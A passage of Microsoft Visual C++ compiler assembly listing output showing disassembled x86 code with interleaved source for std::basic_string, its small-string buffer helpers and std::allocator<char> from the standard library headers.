  00012	51		 push	 ecx
  00013	0f b6 55 ff	 movzx	 edx, BYTE PTR $T1[ebp]
  00017	52		 push	 edx
  00018	8b 4d f4	 mov	 ecx, DWORD PTR tv70[ebp]
  0001b	e8 00 00 00 00	 call	 ??$?0ABV?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_One_then_variadic_args_t@1@ABV?$allocator@D@1@@Z ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><std::allocator<char> const &>

; 2504 :         _Construct_empty();

  00020	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  00023	e8 00 00 00 00	 call	 ?_Construct_empty@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct_empty

; 2505 :     }

  00028	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0002b	8b e5		 mov	 esp, ebp
  0002d	5d		 pop	 ebp
  0002e	c2 04 00	 ret	 4
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@ABV?$allocator@D@1@@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ
_TEXT	SEGMENT
tv69 = -12						; size = 4
_this$ = -8						; size = 4
$T1 = -1						; size = 1
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >, COMDAT
; _this$ = ecx

; 2499 :     basic_string() noexcept(is_nothrow_default_constructible_v<_Alty>) : _Mypair(_Zero_then_variadic_args_t{}) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 0c	 sub	 esp, 12			; 0000000cH
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx
  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f4	 mov	 DWORD PTR tv69[ebp], eax
  0000f	0f b6 4d ff	 movzx	 ecx, BYTE PTR $T1[ebp]
  00013	51		 push	 ecx
  00014	8b 4d f4	 mov	 ecx, DWORD PTR tv69[ebp]
  00017	e8 00 00 00 00	 call	 ??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QAE@U_Zero_then_variadic_args_t@1@@Z ; std::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1>::_Compressed_pair<std::allocator<char>,std::_String_val<std::_Simple_types<char> >,1><>

; 2500 :         _Construct_empty();

  0001c	8b 4d f8	 mov	 ecx, DWORD PTR _this$[ebp]
  0001f	e8 00 00 00 00	 call	 ?_Construct_empty@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXXZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Construct_empty

; 2501 :     }

  00024	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  00027	8b e5		 mov	 esp, ebp
  00029	5d		 pop	 ebp
  0002a	c3		 ret	 0
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@XZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ PROC ; std::_String_val<std::_Simple_types<char> >::~_String_val<std::_Simple_types<char> >, COMDAT
; _this$ = ecx
  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??1_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<char> >::_Bxty::~_Bxty
  0000f	8b e5		 mov	 esp, ebp
  00011	5d		 pop	 ebp
  00012	c3		 ret	 0
??1?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ ENDP ; std::_String_val<std::_Simple_types<char> >::~_String_val<std::_Simple_types<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEXXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEXXZ PROC ; std::_String_val<std::_Simple_types<char> >::_Bxty::_Switch_to_buf, COMDAT
; _this$ = ecx

; 2291 :         _CONSTEXPR20 void _Switch_to_buf() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2292 :             _STD _Destroy_in_place(_Ptr);

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	50		 push	 eax
  0000b	e8 00 00 00 00	 call	 ??$_Destroy_in_place@PAD@std@@YAXAAPAD@Z ; std::_Destroy_in_place<char *>
  00010	83 c4 04	 add	 esp, 4

; 2293 : 
; 2294 : #if _HAS_CXX20
; 2295 :             // start the lifetime of the array elements
; 2296 :             if (_STD is_constant_evaluated()) {
; 2297 :                 for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2298 :                     _Buf[_Idx] = value_type();
; 2299 :                 }
; 2300 :             }
; 2301 : #endif // _HAS_CXX20
; 2302 :         }

  00013	8b e5		 mov	 esp, ebp
  00015	5d		 pop	 ebp
  00016	c3		 ret	 0
?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEXXZ ENDP ; std::_String_val<std::_Simple_types<char> >::_Bxty::_Switch_to_buf
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??1_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??1_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ PROC ; std::_String_val<std::_Simple_types<char> >::_Bxty::~_Bxty, COMDAT
; _this$ = ecx

; 2285 :         _CONSTEXPR20 ~_Bxty() noexcept {} // user-provided, for fancy pointers

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b e5		 mov	 esp, ebp
  00009	5d		 pop	 ebp
  0000a	c3		 ret	 0
??1_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ ENDP ; std::_String_val<std::_Simple_types<char> >::_Bxty::~_Bxty
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??0_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ PROC ; std::_String_val<std::_Simple_types<char> >::_Bxty::_Bxty, COMDAT
; _this$ = ecx

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	33 c0		 xor	 eax, eax
  00009	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000c	89 01		 mov	 DWORD PTR [ecx], eax
  0000e	89 41 04	 mov	 DWORD PTR [ecx+4], eax
  00011	89 41 08	 mov	 DWORD PTR [ecx+8], eax
  00014	89 41 0c	 mov	 DWORD PTR [ecx+12], eax
  00017	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001a	8b e5		 mov	 esp, ebp
  0001c	5d		 pop	 ebp
  0001d	c3		 ret	 0
??0_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ ENDP ; std::_String_val<std::_Simple_types<char> >::_Bxty::_Bxty
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEXXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEXXZ PROC ; std::_String_val<std::_Simple_types<char> >::_Activate_SSO_buffer, COMDAT
; _this$ = ecx

; 2247 :     _CONSTEXPR20 void _Activate_SSO_buffer() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2248 :         // start the lifetime of the array elements
; 2249 : #if _HAS_CXX20
; 2250 :         if (_STD is_constant_evaluated()) {
; 2251 :             for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2252 :                 _Bx._Buf[_Idx] = value_type();
; 2253 :             }
; 2254 :         }
; 2255 : #endif // _HAS_CXX20
; 2256 :     }

  00007	8b e5		 mov	 esp, ebp
  00009	5d		 pop	 ebp
  0000a	c3		 ret	 0
?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEXXZ ENDP ; std::_String_val<std::_Simple_types<char> >::_Activate_SSO_buffer
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@D@std@@@std@@QBE_NXZ
_TEXT	SEGMENT
_this$ = -8						; size = 4
tv66 = -4						; size = 4
?_Large_mode_engaged@?$_String_val@U?$_Simple_types@D@std@@@std@@QBE_NXZ PROC ; std::_String_val<std::_Simple_types<char> >::_Large_mode_engaged, COMDAT
; _this$ = ecx

; 2243 :     _NODISCARD _CONSTEXPR20 bool _Large_mode_engaged() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 2244 :         return _Myres > _Small_string_capacity;

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	83 78 14 0f	 cmp	 DWORD PTR [eax+20], 15	; 0000000fH
  00010	76 09		 jbe	 SHORT $LN3@Large_mode
  00012	c7 45 fc 01 00
	00 00		 mov	 DWORD PTR tv66[ebp], 1
  00019	eb 07		 jmp	 SHORT $LN4@Large_mode
$LN3@Large_mode:
  0001b	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR tv66[ebp], 0
$LN4@Large_mode:
  00022	0f b6 45 fc	 movzx	 eax, BYTE PTR tv66[ebp]

; 2245 :     }

  00026	8b e5		 mov	 esp, ebp
  00028	5d		 pop	 ebp
  00029	c3		 ret	 0
?_Large_mode_engaged@?$_String_val@U?$_Simple_types@D@std@@@std@@QBE_NXZ ENDP ; std::_String_val<std::_Simple_types<char> >::_Large_mode_engaged
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QBEPBDXZ
_TEXT	SEGMENT
__Result$ = -8						; size = 4
_this$ = -4						; size = 4
?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QBEPBDXZ PROC ; std::_String_val<std::_Simple_types<char> >::_Myptr, COMDAT
; _this$ = ecx

; 2234 :     _NODISCARD _CONSTEXPR20 const value_type* _Myptr() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2235 :         const value_type* _Result = _Bx._Buf;

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f8	 mov	 DWORD PTR __Result$[ebp], eax

; 2236 :         if (_Large_mode_engaged()) {

  0000f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00012	e8 00 00 00 00	 call	 ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@D@std@@@std@@QBE_NXZ ; std::_String_val<std::_Simple_types<char> >::_Large_mode_engaged
  00017	0f b6 c8	 movzx	 ecx, al
  0001a	85 c9		 test	 ecx, ecx
  0001c	74 11		 je	 SHORT $LN2@Myptr

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

  0001e	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00021	8b 02		 mov	 eax, DWORD PTR [edx]
  00023	50		 push	 eax
  00024	e8 00 00 00 00	 call	 ??$_Unfancy@D@std@@YAPADPAD@Z ; std::_Unfancy<char>
  00029	83 c4 04	 add	 esp, 4
  0002c	89 45 f8	 mov	 DWORD PTR __Result$[ebp], eax
$LN2@Myptr:

; 2238 :         }
; 2239 : 
; 2240 :         return _Result;

  0002f	8b 45 f8	 mov	 eax, DWORD PTR __Result$[ebp]

; 2241 :     }

  00032	8b e5		 mov	 esp, ebp
  00034	5d		 pop	 ebp
  00035	c3		 ret	 0
?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QBEPBDXZ ENDP ; std::_String_val<std::_Simple_types<char> >::_Myptr
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEPADXZ
_TEXT	SEGMENT
__Result$ = -8						; size = 4
_this$ = -4						; size = 4
?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEPADXZ PROC ; std::_String_val<std::_Simple_types<char> >::_Myptr, COMDAT
; _this$ = ecx

; 2225 :     _NODISCARD _CONSTEXPR20 value_type* _Myptr() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2226 :         value_type* _Result = _Bx._Buf;

  00009	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	89 45 f8	 mov	 DWORD PTR __Result$[ebp], eax

; 2227 :         if (_Large_mode_engaged()) {

  0000f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00012	e8 00 00 00 00	 call	 ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@D@std@@@std@@QBE_NXZ ; std::_String_val<std::_Simple_types<char> >::_Large_mode_engaged
  00017	0f b6 c8	 movzx	 ecx, al
  0001a	85 c9		 test	 ecx, ecx
  0001c	74 11		 je	 SHORT $LN2@Myptr

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

  0001e	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00021	8b 02		 mov	 eax, DWORD PTR [edx]
  00023	50		 push	 eax
  00024	e8 00 00 00 00	 call	 ??$_Unfancy@D@std@@YAPADPAD@Z ; std::_Unfancy<char>
  00029	83 c4 04	 add	 esp, 4
  0002c	89 45 f8	 mov	 DWORD PTR __Result$[ebp], eax
$LN2@Myptr:

; 2229 :         }
; 2230 : 
; 2231 :         return _Result;

  0002f	8b 45 f8	 mov	 eax, DWORD PTR __Result$[ebp]

; 2232 :     }

  00032	8b e5		 mov	 esp, ebp
  00034	5d		 pop	 ebp
  00035	c3		 ret	 0
?_Myptr@?$_String_val@U?$_Simple_types@D@std@@@std@@QAEPADXZ ENDP ; std::_String_val<std::_Simple_types<char> >::_Myptr
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??0?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ PROC ; std::_String_val<std::_Simple_types<char> >::_String_val<std::_Simple_types<char> >, COMDAT
; _this$ = ecx

; 2212 :     _CONSTEXPR20 _String_val() noexcept : _Bx() {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0000a	e8 00 00 00 00	 call	 ??0_Bxty@?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ ; std::_String_val<std::_Simple_types<char> >::_Bxty::_Bxty

; 2213 : 
; 2214 :     // length of internal buffer, [1, 16] (NB: used by the debugger visualizer)
; 2215 :     static constexpr size_type _BUF_SIZE = 16 / sizeof(value_type) < 1 ? 1 : 16 / sizeof(value_type);
; 2216 :     // roundup mask for allocated buffers, [0, 15]
; 2217 :     static constexpr size_type _Alloc_mask = sizeof(value_type) <= 1 ? 15
; 2218 :                                            : sizeof(value_type) <= 2 ? 7
; 2219 :                                            : sizeof(value_type) <= 4 ? 3
; 2220 :                                            : sizeof(value_type) <= 8 ? 1
; 2221 :                                                                      : 0;
; 2222 :     // capacity in small mode
; 2223 :     static constexpr size_type _Small_string_capacity = _BUF_SIZE - 1;
; 2224 : 
; 2225 :     _NODISCARD _CONSTEXPR20 value_type* _Myptr() noexcept {
; 2226 :         value_type* _Result = _Bx._Buf;
; 2227 :         if (_Large_mode_engaged()) {
; 2228 :             _Result = _Unfancy(_Bx._Ptr);
; 2229 :         }
; 2230 : 
; 2231 :         return _Result;
; 2232 :     }
; 2233 : 
; 2234 :     _NODISCARD _CONSTEXPR20 const value_type* _Myptr() const noexcept {
; 2235 :         const value_type* _Result = _Bx._Buf;
; 2236 :         if (_Large_mode_engaged()) {
; 2237 :             _Result = _Unfancy(_Bx._Ptr);
; 2238 :         }
; 2239 : 
; 2240 :         return _Result;
; 2241 :     }
; 2242 : 
; 2243 :     _NODISCARD _CONSTEXPR20 bool _Large_mode_engaged() const noexcept {
; 2244 :         return _Myres > _Small_string_capacity;
; 2245 :     }
; 2246 : 
; 2247 :     _CONSTEXPR20 void _Activate_SSO_buffer() noexcept {
; 2248 :         // start the lifetime of the array elements
; 2249 : #if _HAS_CXX20
; 2250 :         if (_STD is_constant_evaluated()) {
; 2251 :             for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2252 :                 _Bx._Buf[_Idx] = value_type();
; 2253 :             }
; 2254 :         }
; 2255 : #endif // _HAS_CXX20
; 2256 :     }
; 2257 : 
; 2258 :     _CONSTEXPR20 void _Check_offset(const size_type _Off) const {
; 2259 :         // checks whether _Off is in the bounds of [0, size()]
; 2260 :         if (_Mysize < _Off) {
; 2261 :             _Xran();
; 2262 :         }
; 2263 :     }
; 2264 : 
; 2265 :     _CONSTEXPR20 void _Check_offset_exclusive(const size_type _Off) const {
; 2266 :         // checks whether _Off is in the bounds of [0, size())
; 2267 :         if (_Mysize <= _Off) {
; 2268 :             _Xran();
; 2269 :         }
; 2270 :     }
; 2271 : 
; 2272 :     [[noreturn]] static void _Xran() {
; 2273 :         _Xout_of_range("invalid string position");
; 2274 :     }
; 2275 : 
; 2276 :     _NODISCARD _CONSTEXPR20 size_type _Clamp_suffix_size(const size_type _Off, const size_type _Size) const noexcept {
; 2277 :         // trims _Size to the longest it can be assuming a string at/after _Off
; 2278 :         return (_STD min)(_Size, _Mysize - _Off);
; 2279 :     }
; 2280 : 
; 2281 :     union _Bxty { // storage for small buffer or pointer to larger one
; 2282 :         // This constructor previously initialized _Ptr. Don't rely on the new behavior without
; 2283 :         // renaming `_String_val` (and fixing the visualizer).
; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers
; 2285 :         _CONSTEXPR20 ~_Bxty() noexcept {} // user-provided, for fancy pointers
; 2286 : 
; 2287 :         value_type _Buf[_BUF_SIZE];
; 2288 :         pointer _Ptr;
; 2289 :         char _Alias[_BUF_SIZE]; // TRANSITION, ABI: _Alias is preserved for binary compatibility (especially /clr)
; 2290 : 
; 2291 :         _CONSTEXPR20 void _Switch_to_buf() noexcept {
; 2292 :             _STD _Destroy_in_place(_Ptr);
; 2293 : 
; 2294 : #if _HAS_CXX20
; 2295 :             // start the lifetime of the array elements
; 2296 :             if (_STD is_constant_evaluated()) {
; 2297 :                 for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2298 :                     _Buf[_Idx] = value_type();
; 2299 :                 }
; 2300 :             }
; 2301 : #endif // _HAS_CXX20
; 2302 :         }
; 2303 :     };
; 2304 :     _Bxty _Bx;
; 2305 : 
; 2306 :     // invariant: _Myres >= _Mysize, and _Myres >= _Small_string_capacity (after string's construction)
; 2307 :     // neither _Mysize nor _Myres takes account of the extra null terminator
; 2308 :     size_type _Mysize = 0; // current length of string (size)

  0000f	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00012	c7 40 10 00 00
	00 00		 mov	 DWORD PTR [eax+16], 0

; 2309 :     size_type _Myres  = 0; // current storage reserved for string (capacity)

  00019	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001c	c7 41 14 00 00
	00 00		 mov	 DWORD PTR [ecx+20], 0

; 2212 :     _CONSTEXPR20 _String_val() noexcept : _Bx() {}

  00023	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00026	8b e5		 mov	 esp, ebp
  00028	5d		 pop	 ebp
  00029	c3		 ret	 0
??0?$_String_val@U?$_Simple_types@D@std@@@std@@QAE@XZ ENDP ; std::_String_val<std::_Simple_types<char> >::_String_val<std::_Simple_types<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SA?AV?$allocator@D@2@ABV32@@Z
_TEXT	SEGMENT
___$ReturnUdt$ = 8					; size = 4
__Al$ = 12						; size = 4
?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SA?AV?$allocator@D@2@ABV32@@Z PROC ; std::_Default_allocator_traits<std::allocator<char> >::select_on_container_copy_construction, COMDAT

; 744  :     _NODISCARD static _CONSTEXPR20 _Alloc select_on_container_copy_construction(const _Alloc& _Al) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 745  :         return _Al;

  00003	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 746  :     }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SA?AV?$allocator@D@2@ABV32@@Z ENDP ; std::_Default_allocator_traits<std::allocator<char> >::select_on_container_copy_construction
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?max_size@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SAIABV?$allocator@D@2@@Z
_TEXT	SEGMENT
___formal$ = 8						; size = 4
?max_size@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SAIABV?$allocator@D@2@@Z PROC ; std::_Default_allocator_traits<std::allocator<char> >::max_size, COMDAT

; 740  :     _NODISCARD static _CONSTEXPR20 size_type max_size(const _Alloc&) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 741  :         return static_cast<size_t>(-1) / sizeof(value_type);

  00003	83 c8 ff	 or	 eax, -1

; 742  :     }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
?max_size@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SAIABV?$allocator@D@2@@Z ENDP ; std::_Default_allocator_traits<std::allocator<char> >::max_size
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?allocate@?$allocator@D@std@@QAEPADI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Count$ = 8						; size = 4
?allocate@?$allocator@D@std@@QAEPADI@Z PROC		; std::allocator<char>::allocate, COMDAT
; _this$ = ecx

; 980  :     _NODISCARD_RAW_PTR_ALLOC _CONSTEXPR20 __declspec(allocator) _Ty* allocate(_CRT_GUARDOVERFLOW const size_t _Count) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 981  :         static_assert(sizeof(value_type) > 0, "value_type must be complete before calling allocate.");
; 982  :         return static_cast<_Ty*>(_Allocate<_New_alignof<_Ty>>(_Get_size_of_n<sizeof(_Ty)>(_Count)));

  00007	8b 45 08	 mov	 eax, DWORD PTR __Count$[ebp]
  0000a	50		 push	 eax
  0000b	e8 00 00 00 00	 call	 ??$_Get_size_of_n@$00@std@@YAII@Z ; std::_Get_size_of_n<1>
  00010	83 c4 04	 add	 esp, 4
  00013	50		 push	 eax
  00014	e8 00 00 00 00	 call	 ??$_Allocate@$07U_Default_allocate_traits@std@@$0A@@std@@YAPAXI@Z ; std::_Allocate<8,std::_Default_allocate_traits,0>
  00019	83 c4 04	 add	 esp, 4

; 983  :     }

  0001c	8b e5		 mov	 esp, ebp
  0001e	5d		 pop	 ebp
  0001f	c2 04 00	 ret	 4
?allocate@?$allocator@D@std@@QAEPADI@Z ENDP		; std::allocator<char>::allocate
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?deallocate@?$allocator@D@std@@QAEXQADI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Ptr$ = 8						; size = 4
__Count$ = 12						; size = 4
?deallocate@?$allocator@D@std@@QAEXQADI@Z PROC		; std::allocator<char>::deallocate, COMDAT
; _this$ = ecx

; 974  :     _CONSTEXPR20 void deallocate(_Ty* const _Ptr, const size_t _Count) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 975  :         _STL_ASSERT(_Ptr != nullptr || _Count == 0, "null pointer cannot point to a block of non-zero size");
; 976  :         // no overflow check on the following multiply; we assume _Allocate did that check
; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00007	8b 45 0c	 mov	 eax, DWORD PTR __Count$[ebp]
  0000a	50		 push	 eax
  0000b	8b 4d 08	 mov	 ecx, DWORD PTR __Ptr$[ebp]
  0000e	51		 push	 ecx
  0000f	e8 00 00 00 00	 call	 ??$_Deallocate@$07$0A@@std@@YAXPAXI@Z ; std::_Deallocate<8,0>
  00014	83 c4 08	 add	 esp, 8

; 978  :     }

  00017	8b e5		 mov	 esp, ebp
  00019	5d		 pop	 ebp
  0001a	c2 08 00	 ret	 8
?deallocate@?$allocator@D@std@@QAEXQADI@Z ENDP		; std::allocator<char>::deallocate
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??0?$allocator@D@std@@QAE@XZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
??0?$allocator@D@std@@QAE@XZ PROC			; std::allocator<char>::allocator<char>, COMDAT
; _this$ = ecx

; 966  :     constexpr allocator() noexcept {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b e5		 mov	 esp, ebp
  0000c	5d		 pop	 ebp
  0000d	c3		 ret	 0
??0?$allocator@D@std@@QAE@XZ ENDP			; std::allocator<char>::allocator<char>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Xlen_string@std@@YAXXZ
_TEXT	SEGMENT
?_Xlen_string@std@@YAXXZ PROC				; std::_Xlen_string, COMDAT

; 2326 : [[noreturn]] inline void _Xlen_string() {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 2327 :     _Xlength_error("string too long");

